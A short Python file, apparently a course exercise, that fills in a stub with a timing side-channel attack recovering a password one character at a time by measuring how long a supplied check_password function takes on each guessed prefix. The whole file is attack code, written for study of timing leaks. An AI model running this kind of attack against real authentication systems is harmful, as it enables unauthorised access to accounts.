from typing import Callable
import time

def online_attack(check_password: Callable) -> str:
    # TODO Implement attack here by calling check_password
    # Return the password
    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    guessed_password = ""

    while True:
        maxTime = -1
        current_char = None
        for char in charset:
            gues = guessed_password + char
            start = time.time()
            check_password(gues)
            timeGues = time.time() - start
            print("guess", timeGues)

            if timeGues > maxTime:
                maxTime = timeGues
                current_char = char

        if current_char is None:
            raise ValueError("No valid character found; check timing logic.")
        
        guessed_password += current_char

        if check_password(guessed_password):
            return guessed_password
